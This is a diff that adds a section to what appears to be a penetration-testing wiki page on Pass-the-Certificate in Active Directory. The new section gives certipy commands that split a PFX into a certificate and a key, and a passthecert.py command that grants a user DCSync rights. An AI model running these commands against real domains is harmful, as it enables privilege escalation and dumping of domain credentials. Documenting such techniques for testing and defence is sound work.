@@ -59,6 +59,17 @@ The ticket obtained can then be used to
 {% hint style="info" %}
 When using Certipy for Pass-the-Certificate, it automatically does [UnPAC-the-hash](unpac-the-hash.md) to recover the account's NT hash, in addition to saving the TGT obtained.
 {% endhint %}
+
+Another alternative is with [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/passthecert.py) (Python) which can be used to conduct multiple techniques like elevate a user for [dcsync.md](../credentials/dumping/dcsync.md "mention") or change password for a specific user.
+
+```bash
+# extract key and cert from the pfx
+certipy cert -pfx "PATH_TO_PFX_CERT" -nokey -out "user.crt"
+certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"
+
+# elevate a user for DCSYNC with passthecert.py
+passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate
+```
 {% endtab %}
 
 {% tab title="Windows" %}
